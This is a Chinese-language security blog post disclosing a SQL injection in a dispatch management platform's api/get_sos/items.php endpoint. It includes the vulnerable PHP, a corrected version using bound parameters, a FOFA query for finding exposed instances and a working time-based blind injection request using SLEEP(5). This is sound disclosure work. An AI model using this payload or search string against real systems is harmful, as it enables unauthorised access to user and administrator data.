---
title: "福建科立讯通信指挥调度管理平台 api/get_sos/items.php SQL注入漏洞"
source: https://mrxn.net/jswz/api-get_sos-items-usernumber-sqli.html
asset_dir: assets/福建科立讯通信指挥调度管理平台-apiget_sositems.php-sql注入漏洞
---

# 福建科立讯通信指挥调度管理平台 api/get\_sos/items.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/21 08:10
* 881浏览
* [0评论](#comment)
* 27分钟阅读

深入探索

Web安全课程

文本剥离工具

漏洞扫描器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

福建科立讯通信指挥调度管理平台是一个专门针对通信行业的管理平台。福建科立讯通信指挥调度管理平台 api/get\_sos/items.php 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> `body="指挥调度管理平台"`

# 漏洞分析

深入探索

在线安全工具

防火墙软件

Windows安全工具

api/get\_sos/items.php 文件内容如下

```
<?php

require_once "../../includes/require.php";
require_once "init_inc.php";

// sostype 1:断电报警 2：关机报警，3:拆除报警 5:通话报警
foreach ($result as $key => &$value) {
        $value['sostype']=get_type($value['sostype']);
}

$data['item']=$result;
$data['page']['total']=$num_rows;
$data['page']['page']=$page;
$data['page']['limit']=$limit;

$header['code'] = "1";
$header['msg'] = "处理成功";
$r['header'] = $header;
$r['data'] = $data;
echo json_encode($r);die;

?>
```

深入探索

安全运维咨询

文件大小转换

Web安全书籍

`$result` 来自 `api/get_sos/init_inc.php`文件，其中业务逻辑实现如下

代码安全审计

```
<?php
require_once "../../includes/require.php";
// http://123.57.6.84/api/client/get_sos.php?usernumber=126&timestamp=100&sign=987f1883a97c5bc239ff4b353c2793db
//安全验证参数
$usernumber = $_REQUEST['usernumber']; //126
$timestamp  = $_REQUEST['timestamp'];  //100
$sign = $_REQUEST['sign'];  //987f1883a97c5bc239ff4b353c2793db
$page = check_str($_REQUEST['page'])?check_str($_REQUEST['page']):0;
if(empty($usernumber) || empty($timestamp) || empty($sign)){
    $_res = '{"header":{"code":"-1", "msg":"invalid params"}}';
    echo $_res;
    exit();
}

$enterprise_uuid = check_str($_REQUEST["enterprise_uuid"]);

//安全验证
$_sql = "select usr_password, usr_type from local_users where usr_operation<>'delete' and usr_number = '".$usernumber."' limit 1";
$_usr_password      = "";
$statement = $db->prepare(check_sql($_sql));
$statement->execute();
$result = $statement->fetchAll(PDO::FETCH_ASSOC);
if ($result != null) {
    $_usr_password  = $result[0]['usr_password'];  //123456
} else {
    $_res = '{"code":"-1", "msg":"user not found"}';
    echo $_res ;
    exit();
}
```

`usernumber` 直接拼接进SQL语句中执行，虽然经过了 `check_sql` 函数

```
if (!function_exists('check_sql')) {
    function check_sql($string) {
        return trim($string); //remove white space
    }
}
```

可以看到此函数仅仅是去除空白，无任何过滤。

漏洞修复方案

虽然最终执行的时候使用了 pdo.prepare 方法预处理执行SQL，但是没有使用参数绑定传参，而是直接将`$_REQUEST['usernumber']` 直接被嵌入到 SQL 查询中，而没有经过任何过滤或转义，然后执行拼接后的SQL语句，等于卵用，最终造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

以下是修改后的安全传参方式

```
$usernumber = $_REQUEST['usernumber'];
$_sql = "SELECT usr_password, usr_type FROM local_users WHERE usr_operation <> 'delete' AND usr_number = :usernumber LIMIT 1";
$statement = $db->prepare($_sql);
$statement->bindParam(':usernumber', $usernumber, PDO::PARAM_STR);  // 绑定参数
$statement->execute();
$result = $statement->fetchAll(PDO::FETCH_ASSOC);
```

# 漏洞复现

## POC

```
GET /api/get_sos/items.php?sign=2&timestamp=1&usernumber=1'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'A HTTP/1.1
Host: test.mrxn.net
```

[![福建科立讯通信指挥调度管理平台 api/get_sos/items.php SQL注入漏洞](images/img-001-fb3765e3e6a6.webp)](https://image.mrxn.net/414bc50049d740828e9ebdfa26d49464.webp)

成功延时 5 秒

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.POC](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[福建科立讯通信指挥调度管理平台 api/get\_sos/items.php SQL注入漏洞](https://mrxn.net/jswz/api-get_sos-items-usernumber-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-get_sos-items-usernumber-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-get\_sos-items-usernumber-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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